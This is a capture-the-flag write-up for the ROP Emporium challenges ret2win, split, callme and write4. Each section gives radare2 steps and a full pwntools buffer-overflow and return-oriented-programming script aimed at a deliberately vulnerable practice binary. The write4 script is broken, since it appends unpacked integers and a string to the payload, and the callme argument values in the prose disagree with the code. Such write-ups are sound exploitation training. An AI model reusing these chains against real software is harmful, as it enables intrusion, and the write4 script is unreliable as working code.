# ROP EMPORIUM <a name="ropemp"></a>
[<p align="right">back to main</p>](https://github.com/Ordered-Chaos/Pwnfolio#main)
***
## Table of Contents
| Challenge          | Walkthrough | Challenge | Walkthrough |
| ------------------ | ----------- | --------- | ----------- |
| [Ret2Win](#ret2win)| [pdf](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/ROP_Emporium/Writeups/Ret2win64.pdf)| Badchars           | tbd |
| [Split](#split)    | [pdf](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/ROP_Emporium/Writeups/Split64.pdf)  | Fluff              | tbd |                           
| [CallMe](#callme)  | [pdf](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/ROP_Emporium/Writeups/Callme64.pdf) | Pivot              | tbd |
| [Write4](#write4)  | [pdf](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/ROP_Emporium/Writeups/Write4.pdf)   | Ret2Csu            | tbd |


***

## RET2WIN 64 bit<a name="ret2win"></a>

> ### Problem
>> In this challenge, there is a function called ret2win located somewhere
>> in the binary which can be used to cat the flag.txt file. 

> ### Solution
>> The goal here is to:
>>
>> - [ ] **Find offset of the ret2win function**
>>> I used the `[0xradare2]> afl` command in radare2 to list the functions with their offsets.
>>> This showed me that the ret2win function was located at address 0x00400756.
>>>
>> - [ ] **Find out the buffer length**
>>> In the ROP Emporium challenges all of the buffers are 40 bytes long.
>>>
>> - [ ] **Overflow the buffer and overwrite `rsp` with the ret2win address offset**
>>> I used a pwntools script in order to execute the exploit.

~~~python

#!/usr/bin/env python

from pwn import *

elf = context.binary = ELF('ret2win')
context.log_level = 'debug'

padding = cyclic(40)
ret2win = p64(0x00400756)

payload = padding
payload += ret2win

io = process(elf.path)
io.sendline(payload)
io.wait_for_close()
io.recvall()

~~~

**Flag:**  *ROPE{a_placeholder_32byte_flag!}* 

[Return to Top](#ropemp)
***

## SPLIT 64 bit<a name="split"></a>

> ### Problem
>> In the split challenge, there exists a function that calls system along with
>> the string `/bin/cat flag.txt` which is all that is needed to get the flag. The 
>> twist is that they are split apart and need to be brought together. The goal here is to:

> ### Solution
>> The goal here is to:
>>
>> - [ ] **Find the address offset of the system call**
>>> Here I used the `[0xradare2]> afl` command in radare2 to list the functions. From there I navigated to 
>>> the *usefulFunction* using `[0xradare2]> s usefulFunction` followed by a `[0xradare2]> pdf` command to disassemble
>>> the function. This gave me the address of the system call.
>>>
>> - [ ] **Find the address offset of the `/bin/cat flag.txt` string**
>>> I used the `[0xradare2]> iz` command in radare2 to print a list of strings in the binary. From here I 
>>> was able to find the address of the `/bin/cat flag.txt` string.
>>>
>> - [ ] **Find a ROP gadget that can pop our string into `rdi`**
>>> The `[0xradare2]> /R pop rdi;` command in radare2 searches through the binary and lists all ROP gadgets
>>> that have the `pop rdi;` instruction. This gave me the address to the gadget.
>>>
>> - [ ] **Overflow the buffer, overwrite `rsp` and execute the exploit**
>>> As always, I created a pwntools script in order to execute the exploit.

~~~python

#!/usr/bin/env python

from pwn import *

elf = context.binary = ELF('split')  # setting up the environment
context.log_level = 'debug'       

usefulstring = p64(0x601060)         # 'cat flag.txt' string
systemaddr = p64(0x40074b)           # call to system in usefulFunction
rop = p64(0x4007c3)                  # pop rdi; ret;
padding = cyclic(40)

payload = padding                    # junk to fill up buffer
payload += rop                       # pops '/bin/cat flag.txt' into rdi
payload += usefulstring              # string to be as the argument
payload += systemaddr                # call to system in useful function

io = process(elf.path)
io.sendline(payload)                 # sends payload
io.wait_for_close()                  
flag = io.recvall()
print(flag)

~~~

**Flag:**  *ROPE{a_placeholder_32byte_flag!}* 

[Return to Top](#ropemp)
***

## CALLME 64 bit<a name="callme"></a>

> ## Problem
>> In order to get the flag in the callme challenge, there are 3 functions that need
>> to be called in order. Each function must be called with with the arguments 
>> *0xdeadbeef, 0xdoodfood, and 0xcafebabe*. 

> ## Solution
>> One important point to note is that the functions will have to be called with their
>> *.plt* address as opposed to their offset. This challanged will be the first in which
>>  a legitimate rop chain will be used. The goal here will be too:
>> - [ ] **Find the *.plt* addresses of the 3 required functions**
>>> In radare2, the `[0xradare2]> afl` command lists the function along with their *.plt* addresses.
>>> All that needs to be done is to note these addresses.
>>> 
>> - [ ] **Locate a rop gadget or chain of gadgets that can hold the arguments**
>>> In 64 bit systems, the first 6 arguments to a function call are passed in the *rdi, rsi, rdx, rcx, 
>>> r8, r9* registers in that order. Using the `[0xradare2]> /R pop rdi;` command in radare2 you're able to to see a list rop gadget
>>> chains that start with the `pop rdi;` instruction. In this binary, there happens to 
>>> be a `pop rdi; pop rsi; pop rdx; ret;` chain which is perfect for handling the 3 arguments.
>>>
>> - [ ] **Create and execute a script that chains all of the elements together**
>>> As a matter of course, I created a pwntools script to automate the exploit.

~~~python

#!/usr/bin/env python

from pwn import *

elf = context.binary = ELF('callme')  # setting up the environment
context.log_level = 'debug'       

padding = cyclic(40)                  # junk to fill up buffer
para1 = p64(0xdeadbeefdeadbeef)       # first function arg 
para2 = p64(0xcafebabecafebabe)       # second function arg
para3 = p64(0xd00df00dd00df00d)       # third function arg
rop = p64(0x40093c)                   # pop rdi; pop rsi; pop rdx; ret;
callme1 = p64(0x400720)               # .plt of first function call  
callme2 = p64(0x400740)               # .plt of second function call
callme3 = p64(0x4006f0)               # .plt of third function call

payload = padding                     # junk to fill up buffer
payload += rop                        # start of ROP Chain
payload += para1
payload += para2
payload += para3
payload += callme1
payload += rop
payload += para1
payload += para2
payload += para3
payload += callme2
payload += rop
payload += para1
payload += para2
payload += para3
payload += callme3                    # end of ROP chain 

io = process(elf.path)
io.sendline(payload)                  # sends payload
io.wait_for_close()                  
flag = io.recvall()                   # receive output
print(flag)                           # print flag!

~~~

**Flag:**  *ROPE{a_placeholder_32byte_flag!}* 

[Return to Top](#ropemp)
***

## WRITE4 64 bit<a name="write4"></a>
[view write-up (w/ screenshots)](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/ROP_Emporium/Writeups/Write4.pdf) <p align="right"></p>

> ### Problem
>> In this challenge there is no magic string we can call upon to print the flag. There is however,
>> a function that executes a system call to print a file and takes a string as an argument.

> ### Solution
>> Since there is no string in memory we can use to print out the flag.txt file, the string will
>> have to be written into a memory location so that it can be used as an argument. Thus the goal here 
>> is to:
>> - [ ] **Locate a writeable location in memory to place our string**
>>> In radare2 the `[0xradare2]> iS ~ rw` (**i**nformation **s**ection **grep** **r**ead/**w**rite) command can be used to find a information on sections with read/write
>>> permissions. It will show the physical address, virtual adddress, size, permission and name of the
>>> sections in the binary. In this case I was able to see that the .data section had rw permission and
>>> after doing a hexdump using the `[0xradare2]> px` (**p**rint he**x**dump) I could see that it was empty as well as large enough
>>> to hold the string "flag.txt".
>>>
>> - [ ] **Locate the print file function to grab the flag**
>>> Using the `[0xradare2]> afl` command to list the functions in the binary 
>>> and see the address of the *imp.print_file* function. This function can print a file
>>> as long as it is supplied the file name as an argument.
>>>
>> - [ ] **Locate a ROP gadget that can be used to write to a memory location**
>>> Using the `[0xradare2]> izz]` command will get a list of strings present in the binary. 
>>> there was a listing for a *usefulGadgets* gadgets function. This function contains a 
>>> `mov qword [r14], r15` gadget which moves the contents of r15 into the location pointed to
>>> by r14. By putting the "flag.txt" into r15 and the address of the .data section in r14, you can
>>> write the string to memory essentially. Now using the `[0xradare2]> /R pop r14; pop r15;]` command you
>>> can check for a gadget that allows us to control what goes into these registers, and in this case there is
>>> a gadget chain present that will do this.
>>>
>> - [ ] **Locate a `pop rdi; ret;` we can use to supply the print file function with the string argument** 
>>> Using the same `[0xradare2]> /R pop rdi; ret;]` command to find a gadget that pops a value in rdi makes this
>>> a simple process.
>>>
>> - [ ] **Write an exploit chaining all of the elements together and execute**
>>> As always, I used a pwntools script to automate the exploit.

~~~python

#!/usr/bin/env python

from pwn import *

elf = context.binary = ELF('write')  # setting up the environment
context.log_level = 'debug'       

padding = cyclic(40)                 # junk to fill up buffer
rop1 = (0x400690)                    # pop r14; pop r15; ret;
rop2 = (0x400693)                    # pop rdi; ret;
move_addr = (0x400628)               # move qword [r14], r15
addr_location = (0x601028)           # start of .data memory section
print_file = (0x400510)              # plt address of print_file function
string = 'flag.txt'                  # string to be placed @ start of .data section

payload = padding                    # start of ROP Chain
payload += rop1
payload += addr_location
payload += string
payload += move_addr
payload += rop2
payload += addr_location
payload += print_file                # end of ROP chain

io = process(elf.path)
io.sendline(payload)                 # sends payload
io.wait_for_close()                  
flag = io.recvall()                  # receive output
print(flag)                          # print output

~~~

**Flag:**  *ROPE{a_placeholder_32byte_flag!}* 

[Return to Top](#ropemp)
***

~~~
